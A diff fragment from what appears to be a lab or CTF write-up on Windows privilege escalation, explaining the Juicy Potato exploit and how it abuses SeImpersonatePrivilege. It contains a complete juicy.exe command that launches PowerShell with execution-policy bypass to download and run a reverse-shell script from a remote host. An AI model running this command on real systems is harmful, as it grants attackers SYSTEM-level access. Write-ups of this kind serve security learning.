@@ -95,7 +95,7 @@ https://ohpe.it/juicy-potato/CLSID/ </br>
 I picked up this CLSID: ```{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}```, And this is the full command I used: </br>
 ```.\juicy.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.18/reverse.ps1')" -t *``` </br>
 
-**Vulnerability Exploited:** Juicy Potato Exploit.
+**Vulnerability Exploited:** Juicy Potato Exploit. </br>
 **Vulnerability Explanation:** Juicy Potato is a local privilege escalation tool to exploit Windows service account’s impersonation privileges. </br>
 The tool takes advantage of the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege if enabled on the machine to elevate the local privileges to System. </br>
 Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users. </br>
